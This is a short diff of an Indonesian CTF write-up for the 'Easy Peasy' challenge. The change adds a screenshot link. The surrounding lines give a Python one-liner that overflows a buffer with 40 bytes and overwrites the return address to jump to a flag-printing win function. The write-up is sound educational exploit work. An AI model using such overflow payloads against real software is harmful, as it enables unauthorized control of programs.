@@ -59,7 +59,7 @@ __int64 win()
 
 berikut alamat dari fungsi win yang mencetak flag
 
-![]()
+![](https://github.com/muhammadhendro/CTF-Writeups/blob/master/2023/DeconstruCT.F%202023/Easy%20Peasy/1.png)
 
 ```
 python -c "import sys; import struct; sys.stdout.buffer.write(b'A'*40 + struct.pack('<Q', 0x00000000004017ea))" | ./ezpz
